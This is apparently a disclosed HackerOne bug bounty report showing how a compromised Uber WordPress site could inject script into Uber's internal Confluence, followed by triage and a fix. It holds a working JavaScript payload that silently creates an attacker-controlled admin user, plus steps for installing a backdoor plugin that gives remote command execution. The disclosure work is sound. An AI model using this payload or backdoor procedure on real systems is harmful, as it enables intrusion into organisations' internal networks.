{"id":136531,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8xMzY1MzE=","url":"https://hackerone.com/reports/136531","title":"Compromising Atlassian Confluence (team.uberinternal.com) via WordPress (newsroom.uber.com)","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2016-05-05T15:05:45.831Z","submitted_at":"2016-05-05T15:05:45.831Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"jouko","url":"/jouko","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":314,"url":"https://hackerone.com/uber","handle":"uber","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Uber","twitter_handle":"","website":"https://www.uber.com","about":""}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2016-06-06T09:57:03.633Z","bug_reporter_agreed_on_going_public_at":"2016-05-07T09:57:00.118Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"This issue has some relevance to most of my previous submissions so I thought it's clearer if I open a new ticket about it.\n\nI understood you've intended the various *.uber.com WordPress sites to be isolated so that compromising them wouldn't impact Uber's internal network or user data. This has been the main reason why you've assessed the WP vulnerabilities as low risk. However, it looks like to me compromising the newroom.uber.com site hosted at WPEngine opens a trivial way to an attacker to compromise team.uberinternal.com too.\n\nMany (possibly most or all) pages on the said Atlassian Confluence environment refer a script hosted on newsroom.uber.com. For example on the 404 error page:\n~~~~ html\n\u003cscript src=\"https://newsroom.uber.com/wp-content/uploads/adrum.js\"\u003e\u003c/script\u003e\n~~~~\nAn attacker exploiting a vulnerability on *newsroom* can modify the adrum.js file. I've previously demonstrated controlling files under the webroot.\n\nAny injected script would be evaluated for Uber employees logged on Confluence. For instance, this example script (tested on my local test Confluence) appended in adrum.js would create a new Confluence user with a password chosen by the attacker:\n~~~~ javascript\n(function(){\nvar token=AJS.Meta.get('atl-token');\nvar x=new XMLHttpRequest();\nx.open('POST','/admin/users/docreateuser.action');\nx.setRequestHeader(\"Content-type\", \"application/x-www-form-urlencoded\");\nx.send('atl_token='+token+'\u0026username=attacker\u0026fullName=foo\u0026email=new@attacker.com\u0026password=new\u0026confirm=new');\n})();\n~~~~\nUser management in Confluence has an additional security measure: an admin password is asked before allowing the operation. However, the injected script would attempt to create the user on every pageload, and if an administrator enters the user management legitimately any time, the request succeeds.\n\nOf course, this is merely one simple example of what the injected script could do.\n","vulnerability_information_html":"\u003cp\u003eThis issue has some relevance to most of my previous submissions so I thought it\u0026#39;s clearer if I open a new ticket about it.\u003c/p\u003e\n\n\u003cp\u003eI understood you\u0026#39;ve intended the various *.uber.com WordPress sites to be isolated so that compromising them wouldn\u0026#39;t impact Uber\u0026#39;s internal network or user data. This has been the main reason why you\u0026#39;ve assessed the WP vulnerabilities as low risk. However, it looks like to me compromising the newroom.uber.com site hosted at WPEngine opens a trivial way to an attacker to compromise team.uberinternal.com too.\u003c/p\u003e\n\n\u003cp\u003eMany (possibly most or all) pages on the said Atlassian Confluence environment refer a script hosted on newsroom.uber.com. For example on the 404 error page:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight html\"\u003e\u003ccode\u003e\u003cspan class=\"nt\"\u003e\u0026lt;script \u003c/span\u003e\u003cspan class=\"na\"\u003esrc=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;https://newsroom.uber.com/wp-content/uploads/adrum.js\u0026quot;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026gt;\u0026lt;/script\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eAn attacker exploiting a vulnerability on \u003cem\u003enewsroom\u003c/em\u003e can modify the adrum.js file. I\u0026#39;ve previously demonstrated controlling files under the webroot.\u003c/p\u003e\n\n\u003cp\u003eAny injected script would be evaluated for Uber employees logged on Confluence. For instance, this example script (tested on my local test Confluence) appended in adrum.js would create a new Confluence user with a password chosen by the attacker:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kd\"\u003efunction\u003c/span\u003e\u003cspan class=\"p\"\u003e(){\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"nx\"\u003eAJS\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eMeta\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"kd\"\u003eget\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eatl-token\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"k\"\u003enew\u003c/span\u003e \u003cspan class=\"nx\"\u003eXMLHttpRequest\u003c/span\u003e\u003cspan class=\"p\"\u003e();\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003ePOST\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e/admin/users/docreateuser.action\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esetRequestHeader\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eContent-type\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"s2\"\u003eapplication/x-www-form-urlencoded\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"nx\"\u003ex\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003esend\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eatl_token=\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"nx\"\u003etoken\u003c/span\u003e\u003cspan class=\"o\"\u003e+\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026amp;username=attacker\u0026amp;fullName=foo\u0026amp;email=new@attacker.com\u0026amp;password=new\u0026amp;confirm=new\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"p\"\u003e})();\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eUser management in Confluence has an additional security measure: an admin password is asked before allowing the operation. However, the injected script would attempt to create the user on every pageload, and if an administrator enters the user management legitimately any time, the request succeeds.\u003c/p\u003e\n\n\u003cp\u003eOf course, this is merely one simple example of what the injected script could do.\u003c/p\u003e\n","weakness":{"id":75,"name":"Privilege Escalation"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2016-06-06T09:57:02.490Z","allow_singular_disclosure_after":-144008968.79048422,"singular_disclosure_allowed":true,"vote_count":4,"voters":["fizhimchik","japz","spetr0x","dyabla"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":942726,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I made a quick example of how an attacker could have achieved RCE on *team.uberinternal.com* using the *newsroom* vulnerabilities. JavaScript injected in Confluence, when evaluated in an administrator context, can be used to install an add-on/plugin containing the attacker's code. In this example the malicious add-on creates a backdoor servlet.\n\n1. For clarity, in this example the malicious add-on has to be hosted on an external website (it could be also embedded base64-encoded in the JavaScript). The server should allow the file to be loaded with AJAX, i.e. add a CORS header. With Apache .htaccess for example:\n~~~~\nHeader add Access-Control-Allow-Origin \"*\"\n~~~~\n\n2. Append the contents of *injected.js* in the adrum.js which is loaded into Confluence from *newsroom*. The URL in the beginning should be changed to where the plugin is hosted. For testing, you can also add something like this in the template:\n~~~~\n\u003cscript src=\"https://testserver/injected.js\"\u003e\u003c/script\u003e\n~~~~\n\n3. Now, next time a Confluence administrator (doing some administration, after re-entering password which is probably required by default) views any page loading the adrum.js script (e.g. front page), the malicious plugin is installed by some hidden AJAX requests and an iframe.\n\n4. The installed backdoor could be accessed at https://team.uberinternal.com/plugins/servlet/exploit . You can enter commands which are executed on the operating system side.\n\nI tested this on Linux and the latest Atlassian Confluence.","markdown_message":"\u003cp\u003eI made a quick example of how an attacker could have achieved RCE on \u003cem\u003eteam.uberinternal.com\u003c/em\u003e using the \u003cem\u003enewsroom\u003c/em\u003e vulnerabilities. JavaScript injected in Confluence, when evaluated in an administrator context, can be used to install an add-on/plugin containing the attacker\u0026#39;s code. In this example the malicious add-on creates a backdoor servlet.\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003e\n\u003cp\u003eFor clarity, in this example the malicious add-on has to be hosted on an external website (it could be also embedded base64-encoded in the JavaScript). The server should allow the file to be loaded with AJAX, i.e. add a CORS header. With Apache .htaccess for example:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eHeader add Access-Control-Allow-Origin \u0026quot;*\u0026quot;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\n\u003cp\u003eAppend the contents of \u003cem\u003einjected.js\u003c/em\u003e in the adrum.js which is loaded into Confluence from \u003cem\u003enewsroom\u003c/em\u003e. The URL in the beginning should be changed to where the plugin is hosted. For testing, you can also add something like this in the template:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e\u0026lt;script src=\u0026quot;https://testserver/injected.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt;\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eNow, next time a Confluence administrator (doing some administration, after re-entering password which is probably required by default) views any page loading the adrum.js script (e.g. front page), the malicious plugin is installed by some hidden AJAX requests and an iframe.\u003c/p\u003e\u003c/li\u003e\n\u003cli\u003e\u003cp\u003eThe installed backdoor could be accessed at \u003ca title=\"https://team.uberinternal.com/plugins/servlet/exploit\" href=\"/redirect?url=https%3A%2F%2Fteam.uberinternal.com%2Fplugins%2Fservlet%2Fexploit\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://team.uberinternal.com/plugins/servlet/exploit\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e . You can enter commands which are executed on the operating system side.\u003c/p\u003e\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eI tested this on Linux and the latest Atlassian Confluence.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-05T20:04:35.423Z","updated_at":"2016-05-05T20:04:35.423Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":91745,"filename":"atlassian-exploit.zip","type":"application/zip","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/745/b0ee30be961a676f7fcb5b570bc7d09a723c9a8b/atlassian-exploit.zip?response-content-disposition=attachment%3B%20filename%3D%22atlassian-exploit.zip%22%3B%20filename%2A%3DUTF-8%27%27atlassian-exploit.zip\u0026response-content-type=application%2Fzip\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042631Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=1f83fa653d87df00e8dd476d0b5cec167725082109106bfd378067ae4e3ad65f"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":942735,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Here's how the backdoor servlet works on a test server. Source included in the zip.","markdown_message":"\u003cp\u003eHere\u0026#39;s how the backdoor servlet works on a test server. Source included in the zip.\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-05T20:06:44.989Z","updated_at":"2016-05-05T20:06:44.989Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":91746,"filename":"atlassian-backdoor.jpg","type":"image/jpeg","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/091/746/a500917ba44e95ac24c67fd69192ff2b45c09a76/atlassian-backdoor.jpg?response-content-disposition=attachment%3B%20filename%3D%22atlassian-backdoor.jpg%22%3B%20filename%2A%3DUTF-8%27%27atlassian-backdoor.jpg\u0026response-content-type=image%2Fjpeg\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ6J7UOFHP%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T042631Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQDamJ7YR2N3cIBOa8zjuSmUd9OCX8zCykCDx%2B6kH2J%2BlQIhAPFk51DuoGb47ygm%2F46VUWXIRiNzzPuAJCxpuNY6C9r8KrQDCFIQARoMMDEzNjE5Mjc0ODQ5IgwfJ9Wm2OgZB0TD5wEqkQMAyHxawucw3AMqEaVZmpdf%2FWoK6P8gu%2FCj%2FoC7vu86houcl7d5S1aesU3sbrOzgm6RSEhwz%2FFS3jL7D6T4JI4Ce1ND%2FrgO0lyXrQzDIcV61dzQW3FvNLr0ZImyyUdtac%2BXOj%2B4Yuxg3B%2Fw8%2FASrjXwhjBS66Kymk3L6dUfBdgwlGyaWjSrEj7pUe4QmHItRfpiYrIugF6V0YbiwTzCRnupZGkhFUvdnKltp%2B4hMIJ8ZpZXjRaPMFGYbJODmmGmpbXrkLNmtpD9ssAfsLLmMNbkAbfGTVhz1jb8jNtS70QChWZUcaVF%2BUJ%2BnjyviI%2BzOI3PvJo6%2BFF7nuwLNAutvngzDIQqSSVMoO%2F3MB45%2Bi7mOnnapSDDsV974XkQgCuM7vsb5p2hLCxzrxps5NEHGajQr5tkHe3qivszLUiVfsV43w8FYD%2BBONxEK7W9P8Fz8NZ67SyH7GG2ksQHMqmv0OcEaprPoRqnV3X2FUQMilKfrm8Mwo6y2b3BolwJdahB%2FiN%2B4DEDiSex%2FihlgZtj7Y4SxDDk%2FKn%2FBTrqAf559VpL8gNLdFBoVG3N%2FZOK1jnsPcfoIUSZtPAKUZCx%2FfYM8b4F5pg%2FUgEn1Lv%2B2LBdmNBasw6RmzajA5OSfdAMndyjJN9XxpB%2BQCxuWhR%2B4l3UYvcHCs0ptmeXrxe03i6oCQg6cNND1wBmViOKSrRB7ycvKEbOUFZtkHoRDVaID3Z%2BuOzyOMaLFXSvzsVsAcCFgFhIk5QJcY%2B1scZVna72pH8jnKw%2FwC1cIv1j%2FAmz0zBabFT7deSC5tUMl0pZQVYKiEGsgryYN9fSfaoMv2wR80e4kst1hVdlJHDktel9plUkLBliVB9%2BDQ%3D%3D\u0026X-Amz-Signature=354de56f42d77eded60c040847351416ca49b03e05e3a1b36c7b29a881279d1d"}],"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":944536,"is_internal":false,"editable":false,"type":"Activities::BugNeedsMoreInfo","message":"Hello, thanks for your report. \n\nJust to clarify (and please correct me if I'm wrong) the exploit that you're proposing here relies on a vulnerability that was reported in one of our previous reports, or the event that an Admin installs a maliciously crafted plug-in; is that correct? For reference, could you link us to the report that would allow for this exploit? \n\nThanks and good luck in your future bug hunting. ","markdown_message":"\u003cp\u003eHello, thanks for your report. \u003c/p\u003e\n\n\u003cp\u003eJust to clarify (and please correct me if I\u0026#39;m wrong) the exploit that you\u0026#39;re proposing here relies on a vulnerability that was reported in one of our previous reports, or the event that an Admin installs a maliciously crafted plug-in; is that correct? For reference, could you link us to the report that would allow for this exploit? \u003c/p\u003e\n\n\u003cp\u003eThanks and good luck in your future bug hunting. \u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-06T19:27:15.515Z","updated_at":"2016-05-06T19:27:15.515Z","actor":{"username":"bugtriage-rob","cleared":false,"url":"/bugtriage-rob","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":944544,"is_internal":false,"editable":false,"type":"Activities::BugNew","message":"Yes, the script injection can be done if the attacker can control files on *newsroom*. Bugs relevant to newsroom.uber.com: #127948 (stored XSS, allows admin access), #136169 (OneLogin authentication bypass, allows admin access),  #134907 (how to execute arbitrary PHP with admin XSS, one way to modify files).","markdown_message":"\u003cp\u003eYes, the script injection can be done if the attacker can control files on \u003cem\u003enewsroom\u003c/em\u003e. Bugs relevant to newsroom.uber.com: \u003ca href=\"/reports/127948\"\u003e#127948\u003c/a\u003e (stored XSS, allows admin access), \u003ca href=\"/reports/136169\"\u003e#136169\u003c/a\u003e (OneLogin authentication bypass, allows admin access),  \u003ca href=\"/reports/134907\"\u003e#134907\u003c/a\u003e (how to execute arbitrary PHP with admin XSS, one way to modify files).\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-06T19:38:17.178Z","updated_at":"2016-05-06T19:38:17.178Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":944693,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hey @jouko, thanks for this submission - this is indeed an interesting case where our Wordpress blogs aren't as sandboxed from corp as we'd like. I'll triage this and get this JS file removed (and we'll take it into account with your other reports).\n\nThanks!","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e, thanks for this submission - this is indeed an interesting case where our Wordpress blogs aren\u0026#39;t as sandboxed from corp as we\u0026#39;d like. I\u0026#39;ll triage this and get this JS file removed (and we\u0026#39;ll take it into account with your other reports).\u003c/p\u003e\n\n\u003cp\u003eThanks!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-06T21:51:38.303Z","updated_at":"2016-05-06T21:51:38.303Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":944696,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-06T21:57:48.020Z","updated_at":"2016-05-06T21:57:48.020Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":944714,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hey @jouko this should be fixed, can you confirm?","markdown_message":"\u003cp\u003eHey \u003ca href=\"/jouko\"\u003e@jouko\u003c/a\u003e this should be fixed, can you confirm?\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-06T22:11:51.624Z","updated_at":"2016-05-06T22:11:51.624Z","actor":{"username":"mandatoryuber","cleared":false,"url":"/mandatoryuber","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/040/287/fe7ca43da855a13d789192535962231dc7bee6ec_original.jpeg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jouko","url":"/jouko"},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":944720,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"yes","markdown_message":"\u003cp\u003eyes\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-06T22:13:39.586Z","updated_at":"2016-05-06T22:13:39.586Z","actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":945078,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-05-07T09:57:02.442Z","updated_at":"2016-05-07T09:57:02.442Z","first_to_agree":true,"actor":{"username":"jouko","cleared":false,"url":"/jouko","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/013/642/e4fdbdb735ac2b938c6eb072303166bc708a9a50_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":947939,"is_internal":false,"editable":false,"type":"Activities::NotEligibleForBounty","message":"Closing as `Ineligible` as discussed in #136169. Please let us know if you find anything else!","markdown_message":"\u003cp\u003eClosing as \u003ccode\u003eIneligible\u003c/code\u003e as discussed in \u003ca href=\"/reports/136169\"\u003e#136169\u003c/a\u003e. Please let us know if you find anything else!\u003c/p\u003e\n","automated_response":false,"created_at":"2016-05-09T22:20:09.478Z","updated_at":"2016-05-09T22:20:09.478Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1000838,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2016-06-06T09:57:03.677Z","updated_at":"2016-06-06T09:57:03.677Z","actor":{"url":"/uber","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/314/24ea21370a71b18eafb5722d5855825ab622b5dd_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Uber"}},"genius_execution_id":null,"team_handle":"uber","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1040570,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I would appreciate changing this to `Resolved` as it's a valid report and a real (even critical) vulnerability. The `Ineligible` status decreases my Signal metric. Even though the effect of a single report is small, it could be important for programs that have a Signal requirement. Bug finders shouldn't be penalised for reporting valid bugs. Thanks!","markdown_message":"\u003cp\u003eI would appreciate changing this to \u003ccode\u003eResolved\u003c/code\u003e as it\u0026#39;s a valid report and a real (even critical) vulnerability. The \u003ccode\u003eIneligible\u003c/code\u003e status decreases my Signal metric. Even though the effect of a single report is small, it could be important for programs that have a Signal requirement. Bug finders shouldn\u0026#39;t be penalised for reporting valid bugs. 